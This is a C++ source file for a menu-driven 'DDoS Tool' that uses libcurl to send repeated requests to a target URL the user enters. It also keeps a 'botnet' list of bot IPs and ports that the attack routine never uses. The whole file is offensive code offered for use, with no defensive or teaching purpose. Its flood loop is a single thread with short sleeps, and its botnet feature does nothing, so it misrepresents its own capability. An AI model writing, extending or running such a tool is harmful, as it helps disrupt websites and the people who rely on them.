#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <chrono>
#include <curl/curl.h>

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void ddosAttack(const std::string& url, int numRequests) {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

        for(int i = 0; i < numRequests; ++i) {
            res = curl_easy_perform(curl);
            if(res != CURLE_OK) {
                std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

struct Bot {
    std::string ip;
    int port;
    bool isActive;
};

std::vector<Bot> botnet;

void addBot(const std::string& ip, int port) {
    Bot newBot = {ip, port, true};
    botnet.push_back(newBot);
}

void removeBot(const std::string& ip) {
    for(auto it = botnet.begin(); it != botnet.end(); ++it) {
        if(it->ip == ip) {
            it->isActive = false;
            break;
        }
    }
}

void showMenu() {
    std::cout << "DDoS Tool Menu:" << std::endl;
    std::cout << "1. Start DDoS Attack" << std::endl;
    std::cout << "2. Add Bot to Botnet" << std::endl;
    std::cout << "3. Remove Bot from Botnet" << std::endl;
    std::cout << "4. Exit" << std::endl;
}

int main() {
    int choice;
    std::string url;
    int numRequests;
    std::string ip;
    int port;

    while(true) {
        showMenu();
        std::cin >> choice;

        switch(choice) {
            case 1:
                std::cout << "Enter target URL: ";
                std::cin.ignore();
                std::getline(std::cin, url);
                std::cout << "Enter number of requests: ";
                std::cin >> numRequests;
                ddosAttack(url, numRequests);
                break;
            case 2:
                std::cout << "Enter bot IP: ";
                std::cin.ignore();
                std::getline(std::cin, ip);
                std::cout << "Enter bot port: ";
                std::cin >> port;
                addBot(ip, port);
                break;
            case 3:
                std::cout << "Enter bot IP to remove: ";
                std::cin.ignore();
                std::getline(std::cin, ip);
                removeBot(ip);
                break;
            case 4:
                return 0;
            default:
                std::cout << "Invalid choice. Please try again." << std::endl;
        }
    }

    return 0;
}